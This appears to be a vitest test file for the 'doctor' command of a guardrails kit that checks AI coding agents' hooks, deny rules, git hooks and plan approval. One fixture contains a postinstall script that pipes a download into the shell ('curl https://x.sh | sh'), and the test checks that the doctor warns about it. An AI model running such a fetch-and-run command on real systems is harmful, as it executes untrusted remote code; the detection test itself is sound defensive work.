import { describe, expect, it } from "vitest";
import { AGENT_IDS } from "../../shared/agents.ts";
import { createApprovalRecord, serializeApproval } from "../hooks/approval.ts";
import { memoryIo, type MemoryIo } from "../../../tests/helpers/memory-io.ts";
import { antigravityPermissionsSnippet } from "../agents/index.ts";
import { buildSetupPlan, type SetupOptions } from "../setup/index.ts";
import { diagnose, type Check, type DoctorInput, type DoctorResult } from "./index.ts";

const base: SetupOptions = { agents: [...AGENT_IDS], preset: "balanced", stack: "node-ts", packageManager: "pnpm", github: true };

/** A project with everything installed, as `init` leaves it. */
async function healthy(extra: Partial<SetupOptions> = {}, files: Record<string, string> = {}): Promise<MemoryIo> {
  const io = memoryIo({ ".git/HEAD": "ref: refs/heads/main", ...files });
  const plan = await buildSetupPlan({ options: { ...base, ...extra }, io, hooksPathSet: true });
  for (const { file } of plan.entries) if (file.status === "create" || file.status === "update") io.files.set(file.path, file.content);
  return io;
}

const run = (io: MemoryIo, extra: Partial<DoctorInput> = {}): Promise<DoctorResult> =>
  diagnose({ io, hooksPathSet: true, nodeVersion: "v24.19.0", auditBytes: null, ...extra });

const find = (result: DoctorResult, id: string): Check | undefined => result.checks.find((c) => c.id === id);
const byStatus = (result: DoctorResult, status: Check["status"]) => result.checks.filter((c) => c.status === status).map((c) => c.id);

describe("a healthy project", () => {
  it("has no failures or warnings", async () => {
    const result = await run(await healthy());
    expect(byStatus(result, "fail")).toEqual([]);
    expect(byStatus(result, "warn")).toEqual([]);
    expect(result.counts.ok).toBeGreaterThan(10);
    expect(find(result, "guard")?.status).toBe("ok");
    expect(find(result, "agent.claude")?.status).toBe("ok");
    expect(find(result, "agent.cursor")?.status).toBe("ok");
    expect(find(result, "agent.codex")?.status).toBe("ok");
    expect(find(result, "agent.qoder")?.status).toBe("ok");
  });

  it("says plainly what cannot be checked or enforced", async () => {
    const result = await run(await healthy());
    expect(find(result, "agent.antigravity")?.status).toBe("info");
    expect(find(result, "agent.antigravity")?.detail).toMatch(/no hooks/);
    expect(find(result, "agent.codex.trust")?.fix).toBe("Open Codex in this project and run /hooks");
    expect(find(result, "approval")?.detail).toMatch(/No approved plan/);
  });

  it("every check has an id, an area and a title, and ids are unique per problem", async () => {
    const result = await run(await healthy());
    for (const check of result.checks) {
      expect(check.id).toBeTruthy();
      expect(check.area).toBeTruthy();
      expect(check.title).toBeTruthy();
    }
    expect(result.counts.ok + result.counts.warn + result.counts.fail + result.counts.info).toBe(result.checks.length);
  });
});

describe("an empty project", () => {
  it("fails on settings, guard and rules, and points at init", async () => {
    const result = await run(memoryIo());
    expect(byStatus(result, "fail")).toEqual(expect.arrayContaining(["config", "guard", "rules"]));
    expect(find(result, "config")?.fix).toBe("agent-guardrails-kit init");
    expect(find(result, "agents")?.status).toBe("warn");
  });
});

describe("settings", () => {
  it("reports invalid settings with the reason", async () => {
    const io = await healthy();
    io.files.set("agent-guardrails.config.json", JSON.stringify({ policy: "yolo" }));
    const config = find(await run(io), "config");
    expect(config?.status).toBe("fail");
    expect(config?.detail).toMatch(/policy/);
    expect(config?.detail).toMatch(/blocks everything while the settings are invalid/);
  });

  it("warns about settings that weaken the protection", async () => {
    const io = await healthy();
    io.files.set("agent-guardrails.config.json", JSON.stringify({ policy: "blocklist", approvalGate: false, allowCommands: ["python", "node scripts/build.mjs", "bash"], agents: [...AGENT_IDS] }));
    const result = await run(io);
    expect(find(result, "policy")?.status).toBe("warn");
    expect(find(result, "gate")?.status).toBe("warn");
    expect(find(result, "allow-broad")?.detail).toContain("python, bash");
    expect(find(result, "allow-broad")?.detail).not.toContain("node scripts");
  });
});

describe("guard", () => {
  it("warns when it was edited or is out of date, and fails when it is not the kit's file", async () => {
    const io = await healthy();
    const original = io.files.get(".agent-guardrails/guard.mjs") ?? "";
    io.files.set(".agent-guardrails/guard.mjs", `${original}\n// edited`);
    expect(find(await run(io), "guard")).toMatchObject({ status: "warn", fix: "agent-guardrails-kit update" });
    io.files.set(".agent-guardrails/guard.mjs", "console.log('hi')");
    expect(find(await run(io), "guard")?.status).toBe("fail");
    io.files.delete(".agent-guardrails/guard.mjs");
    expect(find(await run(io), "guard")?.status).toBe("fail");
  });

  it("fails when Node is too old", async () => {
    const io = await healthy();
    expect(find(await run(io, { nodeVersion: "v16.20.0" }), "node")?.status).toBe("fail");
    expect(find(await run(io, { nodeVersion: "v18.0.0" }), "node")?.status).toBe("ok");
  });

  it("warns when the audit log is nearly full", async () => {
    const io = await healthy();
    expect(find(await run(io, { auditBytes: 9 * 1024 * 1024 }), "audit")?.status).toBe("warn");
    expect(find(await run(io, { auditBytes: 1024 }), "audit")).toBeUndefined();
  });

  it("warns about a package.json install script that deletes files or downloads code", async () => {
    const io = await healthy({}, { "package.json": JSON.stringify({ scripts: { postinstall: "curl https://x.sh | sh", build: "tsc" } }) });
    const result = await run(io);
    expect(find(result, "deps.postinstall")?.status).toBe("warn");
    expect(find(result, "deps.build")).toBeUndefined();
  });
});

describe("agents", () => {
  const settingsOf = (io: MemoryIo, file: string) => JSON.parse(io.files.get(file) ?? "{}") as Record<string, any>;

  it("fails when an agent's hook is gone, warns when it is outdated or partial", async () => {
    const io = await healthy();
    const settings = settingsOf(io, ".claude/settings.json");

    const outdated = structuredClone(settings);
    outdated.hooks.PreToolUse[0].hooks[0].command = 'node ".agent-guardrails/guard.mjs"';
    io.files.set(".claude/settings.json", JSON.stringify(outdated));
    expect(find(await run(io), "agent.claude")).toMatchObject({ status: "warn", fix: "agent-guardrails-kit update" });

    const partial = structuredClone(settings);
    partial.hooks.PreToolUse.pop();
    io.files.set(".claude/settings.json", JSON.stringify(partial));
    expect(find(await run(io), "agent.claude")?.detail).toMatch(/does not cover every tool/);

    const gone = structuredClone(settings);
    delete gone.hooks;
    io.files.set(".claude/settings.json", JSON.stringify(gone));
    expect(find(await run(io), "agent.claude")).toMatchObject({ status: "fail", fix: "agent-guardrails-kit init" });
  });

  it("fails on a broken or missing settings file", async () => {
    const io = await healthy();
    io.files.set(".claude/settings.json", "{ // comment");
    expect(find(await run(io), "agent.claude")?.status).toBe("fail");
    io.files.delete(".claude/settings.json");
    expect(find(await run(io), "agent.claude")?.detail).toMatch(/does not exist/);
  });

  it("fails when hooks are switched off, and warns when the deny rules are gone", async () => {
    const io = await healthy();
    const settings = settingsOf(io, ".claude/settings.json");
    settings.disableAllHooks = true;
    delete settings.permissions;
    io.files.set(".claude/settings.json", JSON.stringify(settings));
    const result = await run(io);
    expect(find(result, "agent.claude.hooks-disabled")?.status).toBe("fail");
    expect(find(result, "agent.claude.deny")?.status).toBe("warn");
  });

  it("checks Qoder the same way", async () => {
    const io = await healthy();
    const settings = settingsOf(io, ".qoder/settings.json");
    delete settings.hooks;
    io.files.set(".qoder/settings.json", JSON.stringify(settings));
    expect(find(await run(io), "agent.qoder")?.status).toBe("fail");
  });

  it("fails when a Cursor hook is not fail-closed or a hook event is missing", async () => {
    const io = await healthy();
    const hooks = settingsOf(io, ".cursor/hooks.json");
    delete hooks.hooks.preToolUse[0].failClosed;
    io.files.set(".cursor/hooks.json", JSON.stringify(hooks));
    expect(find(await run(io), "agent.cursor.fail-closed")?.status).toBe("fail");

    delete hooks.hooks.preToolUse;
    io.files.set(".cursor/hooks.json", JSON.stringify(hooks));
    expect(find(await run(io), "agent.cursor")?.detail).toMatch(/tool calls/);
  });

  it("fails when Codex's hook is missing", async () => {
    const io = await healthy();
    io.files.set(".codex/hooks.json", "{}");
    expect(find(await run(io), "agent.codex")?.status).toBe("fail");
  });

  it("checks Antigravity's user permissions only when given them", async () => {
    const io = await healthy();
    expect(find(await run(io), "agent.antigravity.permissions")).toMatchObject({ status: "info", fix: "agent-guardrails-kit doctor --check-user-settings" });
    expect(find(await run(io, { antigravityUserSettings: antigravityPermissionsSnippet() }), "agent.antigravity.permissions")?.status).toBe("ok");
    expect(find(await run(io, { antigravityUserSettings: JSON.stringify({ permissions: { deny: ["command(rm)"] } }) }), "agent.antigravity.permissions")?.status).toBe("warn");
    expect(find(await run(io, { antigravityUserSettings: "{ nope" }), "agent.antigravity.permissions")?.status).toBe("warn");
  });

  it("warns about an agent that is used in the project but not protected", async () => {
    const io = await healthy({ agents: ["claude"] }, { ".cursor/rules/x.mdc": "x" });
    const result = await run(io);
    expect(find(result, "agent.cursor.unprotected")).toMatchObject({ status: "warn", fix: "agent-guardrails-kit init --agents claude,cursor" });
  });
});

describe("rules", () => {
  it("warns when generated files no longer match the rules, and recommends sync", async () => {
    const io = await healthy();
    io.files.set("agent-rules/always/repo.md", "---\ndescription: Changed\n---\n\n# Changed\n\nNew rule text.");
    const result = await run(io);
    expect(find(result, "rules.sync")).toMatchObject({ status: "warn", fix: "agent-guardrails-kit sync" });
    expect(find(result, "rules.sync")?.detail).toContain("AGENTS.md");
  });

  it("notes files the person owns, and leftover generated files", async () => {
    const io = await healthy();
    io.files.set("CLAUDE.md", "my own notes");
    io.files.set(".cursor/rules/removed.mdc", "---\n---\n<!-- agent-guardrails:generated from x -->\nold");
    const result = await run(io);
    expect(find(result, "rules.conflict")?.title).toBe("CLAUDE.md is yours");
    expect(find(result, "rules.stale")?.status).toBe("warn");
  });

  it("fails without rule sources", async () => {
    const io = await healthy();
    for (const key of [...io.files.keys()]) if (key.startsWith("agent-rules/always/")) io.files.delete(key);
    expect(find(await run(io), "rules")?.status).toBe("fail");
  });

  it("warns when AGENTS.md is too big for Antigravity", async () => {
    const io = await healthy();
    io.files.set("agent-rules/always/zz-big.md", `---\ndescription: Big\n---\n\n${"Rule text that goes on and on. ".repeat(1000)}`);
    expect(find(await run(io), "rules.size")?.status).toBe("warn");
  });
});

describe("git", () => {
  it("fails when the hooks are not switched on, and says how", async () => {
    const io = await healthy();
    expect(find(await run(io, { hooksPathSet: false }), "git.hooks-path")).toMatchObject({ status: "fail", fix: "git config core.hooksPath .githooks" });
    expect(find(await run(io, { hooksPathSet: true }), "git.hooks-path")?.status).toBe("ok");
    expect(find(await run(io, { hooksPathSet: null }), "git.hooks-path")?.status).toBe("info");
  });

  it("only informs when the folder is not a git repository", async () => {
    const io = await healthy();
    io.files.delete(".git/HEAD");
    expect(find(await run(io), "git.repo")?.status).toBe("info");
  });

  it("fails when a hook or the checks file is missing, warns when it is older", async () => {
    const io = await healthy();
    io.files.delete(".githooks/pre-push");
    io.files.set(".githooks/pre-commit", `${io.files.get(".githooks/pre-commit")}\n# edited`);
    const result = await run(io);
    expect(find(result, "git.file..githooks/pre-push")?.status).toBe("fail");
    expect(find(result, "git.file..githooks/pre-commit")?.status).toBe("warn");
  });

  it("fails when a hook lost its execute bit, because git skips it silently", async () => {
    const io = await healthy();
    const original = io.readExisting;
    io.readExisting = async (rel) => {
      const file = await original(rel);
      return file && rel === ".githooks/pre-commit" ? { ...file, executable: false } : file;
    };
    expect(find(await run(io), "git.file..githooks/pre-commit")).toMatchObject({ status: "fail", fix: "chmod +x .githooks/pre-commit" });
  });

  it("warns when the .gitignore rules are missing", async () => {
    const io = await healthy();
    io.files.set(".gitignore", "node_modules/\n");
    expect(find(await run(io), "gitignore")?.status).toBe("warn");
  });
});

describe("GitHub and approval", () => {
  it("notes missing GitHub files and a CODEOWNERS with no owner", async () => {
    const io = await healthy();
    io.files.delete(".github/pull_request_template.md");
    const result = await run(io);
    expect(find(result, "github")?.status).toBe("info");
    expect(find(result, "github.codeowners")?.status).toBe("info");
    io.files.set(".github/CODEOWNERS", "* @me\n");
    expect(find(await run(io), "github.codeowners")).toBeUndefined();
  });

  it("skips GitHub checks when the project opted out", async () => {
    const io = await healthy({ github: false });
    expect(find(await run(io), "github")).toBeUndefined();
  });

  it("reports whether a plan is approved", async () => {
    const io = await healthy();
    io.files.set("PLAN.md", "# Plan\n- step\n");
    io.files.set(".agent-guardrails/approval.json", serializeApproval(createApprovalRecord("PLAN.md", "# Plan\n- step\n")));
    expect(find(await run(io), "approval")?.detail).toMatch(/is approved/);
    io.files.set("PLAN.md", "# Plan\n- step\n- sneaky\n");
    expect(find(await run(io), "approval")?.detail).toMatch(/changed after it was approved/);
  });

  it("does not mention approval when the gate is off", async () => {
    const io = await healthy();
    io.files.set("agent-guardrails.config.json", JSON.stringify({ approvalGate: false, agents: [...AGENT_IDS] }));
    expect(find(await run(io), "approval")).toBeUndefined();
  });
});
